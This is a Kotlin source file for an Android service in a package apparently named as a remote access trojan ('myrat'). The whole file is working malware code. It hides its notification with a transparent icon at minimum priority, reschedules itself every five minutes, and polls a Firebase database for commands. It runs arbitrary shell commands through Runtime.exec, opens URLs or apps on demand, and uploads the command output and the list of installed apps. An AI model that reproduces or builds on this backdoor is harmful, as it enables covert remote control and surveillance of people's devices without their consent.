package com.myrat.app.service

import android.app.*
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.myrat.app.LauncherActivity
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import java.io.BufferedReader

class ShellService : Service() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()

        try {
            // Initialize Firebase
            try {
                FirebaseDatabase.getInstance()
                Logger.log("Firebase initialized successfully")
            } catch (e: Exception) {
                Logger.error("Firebase initialization failed", e)
                stopSelf()
                return
            }

            // Set up foreground service
            startForeground(2, buildNotification())
            scheduleRestart(this)

            // Initialize deviceId
            deviceId = try {
                MainActivity.getDeviceId(this) ?: throw IllegalStateException("Device ID is null")
            } catch (e: Exception) {
                Logger.error("Failed to get deviceId", e)
                stopSelf()
                return
            }
            Logger.log("ShellService started for deviceId: $deviceId")

            // Set connected status
            db.child("Device").child(deviceId).child("shell").child("connected")
                .setValue(true)
                .addOnFailureListener { e ->
                    Logger.error("Failed to set connected status", e)
                }

            listenForCommands()
            listenForAppListRequest()
        } catch (e: Exception) {
            Logger.error("ShellService failed to start", e)
            stopSelf()
        }
    }

    private fun scheduleRestart(context: Context) {
        try {
            val alarmIntent = Intent(context, ShellService::class.java)
            val pendingIntent = PendingIntent.getService(
                context, 0, alarmIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 60_000,
                5 * 60_000,
                pendingIntent
            )
        } catch (e: Exception) {
            Logger.error("Failed to schedule restart", e)
        }
    }

    private fun listenForCommands() {
        try {
            db.child("Device").child(deviceId)
                .child("shell/queue")
                .orderByChild("executed")
                .equalTo(false)
                .addChildEventListener(object : ChildEventListener {
                    override fun onChildAdded(snapshot: DataSnapshot, prev: String?) {
                        val cmd = snapshot.child("command").getValue(String::class.java)
                        val commandId = snapshot.key ?: return

                        if (!cmd.isNullOrBlank()) {
                            Logger.log("Executing command: $cmd")
                            executeCommand(cmd, commandId)
                        }
                    }

                    override fun onCancelled(error: DatabaseError) {
                        Logger.error("Command listener cancelled", error.toException())
                    }

                    override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
                    override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
                    override fun onChildRemoved(snapshot: DataSnapshot) {}
                })
        } catch (e: Exception) {
            Logger.error("Failed to set up command listener", e)
        }
    }

    private fun listenForAppListRequest() {
        try {
            db.child("Device").child(deviceId).child("shell/applist/getApps")
                .addValueEventListener(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        try {
                            var value = false
                            var filter = "all"
                            if (snapshot.exists()) {
                                when (val data = snapshot.getValue()) {
                                    is Boolean -> {
                                        value = data
                                    }
                                    is Map<*, *> -> {
                                        value = data["value"] as? Boolean ?: false
                                        filter = data["filter"] as? String ?: "all"
                                    }
                                    else -> {
                                        Logger.error("Invalid getApps data format: $data")
                                        return
                                    }
                                }
                            }
                            if (value) {
                                Logger.log("Received request to fetch installed apps with filter: $filter")
                                fetchAndUploadAppList(filter)
                            }
                        } catch (e: Exception) {
                            Logger.error("Error processing app list request", e)
                        }
                    }

                    override fun onCancelled(error: DatabaseError) {
                        Logger.error("App list listener cancelled", error.toException())
                    }
                })
        } catch (e: Exception) {
            Logger.error("Failed to set up app list listener", e)
        }
    }

    private fun fetchAndUploadAppList(filter: String) {
        Thread {
            try {
                val packageManager = packageManager
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    PackageManager.GET_META_DATA or PackageManager.MATCH_ALL
                } else {
                    PackageManager.GET_META_DATA
                }
                val apps = packageManager.getInstalledApplications(flags)
                val appList = apps
                    .filter { app ->
                        when (filter) {
                            "system" -> (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0
                            "user" -> (app.flags and ApplicationInfo.FLAG_SYSTEM) == 0
                            else -> true // "all"
                        }
                    }
                    .map { app ->
                        mapOf(
                            "packageName" to app.packageName,
                            "appName" to (app.loadLabel(packageManager).toString() ?: app.packageName),
                            "isSystemApp" to ((app.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
                        )
                    }

                Logger.log("Fetched ${appList.size} installed apps with filter $filter: ${appList.joinToString { it["packageName"] as String }}")

                db.child("Device").child(deviceId).child("shell/applist/apps")
                    .setValue(appList)
                    .addOnSuccessListener {
                        Logger.log("Successfully uploaded app list to Firebase")
                        db.child("Device").child(deviceId).child("shell/applist/getApps")
                            .setValue(mapOf("value" to false, "filter" to filter))
                            .addOnFailureListener { e ->
                                Logger.error("Failed to reset getApps", e)
                            }
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload app list", e)
                        db.child("Device").child(deviceId).child("shell/applist/getApps")
                            .setValue(mapOf("value" to false, "filter" to filter))
                            .addOnFailureListener { e ->
                                Logger.error("Failed to reset getApps", e)
                            }
                    }
            } catch (e: Exception) {
                Logger.error("Failed to fetch app list", e)
                db.child("Device").child(deviceId).child("shell/applist/getApps")
                    .setValue(mapOf("value" to false, "filter" to filter))
                    .addOnFailureListener { e ->
                        Logger.error("Failed to reset getApps", e)
                    }
            }
        }.start()
    }

    private fun executeCommand(cmd: String, commandId: String) {
        Thread {
            try {
                // Check if device is locked
                val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
                if (keyguardManager.isKeyguardLocked) {
                    throw SecurityException("Device is locked, cannot launch activities")
                }

                when {
                    // Handle URL opening
                    cmd.startsWith("open ", ignoreCase = true) -> {
                        val url = cmd.substring(5).trim()
                        if (url.startsWith("http://") || url.startsWith("https://")) {
                            val intent = Intent(this, LauncherActivity::class.java).apply {
                                action = "com.myrat.app.ACTION_OPEN_URL"
                                putExtra("url", url)
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            try {
                                Logger.log("Attempting to launch LauncherActivity for URL: $url")
                                startActivity(intent)
                                Logger.log("Launched LauncherActivity for URL: $url")
                                val result = mapOf(
                                    "executed" to true,
                                    "output" to "Opening URL: $url",
                                    "error" to "",
                                    "status" to "success"
                                )
                                db.child("Device").child(deviceId)
                                    .child("shell/queue").child(commandId)
                                    .updateChildren(result)
                                    .addOnFailureListener { e ->
                                        Logger.error("Failed to update Firebase for URL command", e)
                                    }
                            } catch (e: Exception) {
                                Logger.error("Failed to launch LauncherActivity for URL: $url", e)
                                throw ActivityNotFoundException("Failed to launch URL: ${e.message}")
                            }
                        } else {
                            throw IllegalArgumentException("Invalid URL: $url")
                        }
                    }
                    // Handle app opening
                    cmd.startsWith("openapp ", ignoreCase = true) -> {
                        val packageName = cmd.substring(8).trim()
                        if (packageName.isNotEmpty()) {
                            val packageManager = packageManager
                            val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                            if (launchIntent != null) {
                                val intent = Intent(this, LauncherActivity::class.java).apply {
                                    action = "com.myrat.app.ACTION_OPEN_APP"
                                    putExtra("packageName", packageName)
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                }
                                try {
                                    Logger.log("Attempting to launch LauncherActivity for app: $packageName")
                                    startActivity(intent)
                                    Logger.log("Launched LauncherActivity for app: $packageName")
                                    val result = mapOf(
                                        "executed" to true,
                                        "output" to "Opening app: $packageName",
                                        "error" to "",
                                        "status" to "success"
                                    )
                                    db.child("Device").child(deviceId)
                                        .child("shell/queue").child(commandId)
                                        .updateChildren(result)
                                        .addOnFailureListener { e ->
                                            Logger.error("Failed to update Firebase for app command", e)
                                        }
                                } catch (e: Exception) {
                                    Logger.error("Failed to launch LauncherActivity for app: $packageName", e)
                                    throw ActivityNotFoundException("Failed to launch app: ${e.message}")
                                }
                            } else {
                                throw IllegalArgumentException("App not found: $packageName")
                            }
                        } else {
                            throw IllegalArgumentException("Invalid package name")
                        }
                    }
                    // Handle other shell commands
                    else -> {
                        val process = Runtime.getRuntime().exec(cmd)
                        val output = process.inputStream.bufferedReader().use(BufferedReader::readText)
                        val error = process.errorStream.bufferedReader().use(BufferedReader::readText)
                        val exitCode = process.waitFor()

                        Logger.log("Executed: $cmd\nExitCode: $exitCode\nOutput: $output\nError: $error")

                        val result = mapOf(
                            "executed" to true,
                            "output" to output.trim(),
                            "error" to error.trim(),
                            "status" to if (exitCode == 0) "success" else "failed"
                        )
                        db.child("Device").child(deviceId)
                            .child("shell/queue").child(commandId)
                            .updateChildren(result)
                            .addOnFailureListener { e ->
                                Logger.error("Failed to update Firebase for shell command", e)
                            }
                    }
                }
            } catch (e: SecurityException) {
                Logger.error("SecurityException executing command: $cmd", e)
                val errorResult = mapOf(
                    "executed" to true,
                    "output" to "",
                    "error" to "Cannot launch activity: ${e.message}",
                    "status" to "failed"
                )
                db.child("Device").child(deviceId)
                    .child("shell/queue").child(commandId)
                    .updateChildren(errorResult)
                    .addOnFailureListener { e ->
                        Logger.error("Failed to update Firebase for error result", e)
                    }
            } catch (e: Exception) {
                Logger.error("Failed to execute command: $cmd", e)
                val errorResult = mapOf(
                    "executed" to true,
                    "output" to "",
                    "error" to e.message,
                    "status" to "failed"
                )
                db.child("Device").child(deviceId)
                    .child("shell/queue").child(commandId)
                    .updateChildren(errorResult)
                    .addOnFailureListener { e ->
                        Logger.error("Failed to update Firebase for error result", e)
                    }
            }
        }.start()
    }

    private fun buildNotification(): Notification {
        val channelId = "ShellRunnerService"
        val channelName = "Shell Runner"

        try {
            val manager = getSystemService(NotificationManager::class.java)
            if (manager != null) {
                val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_MIN)
                channel.setShowBadge(false)
                manager.createNotificationChannel(channel)
            }

            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Shell Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.color.transparent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build notification", e)
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Shell Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}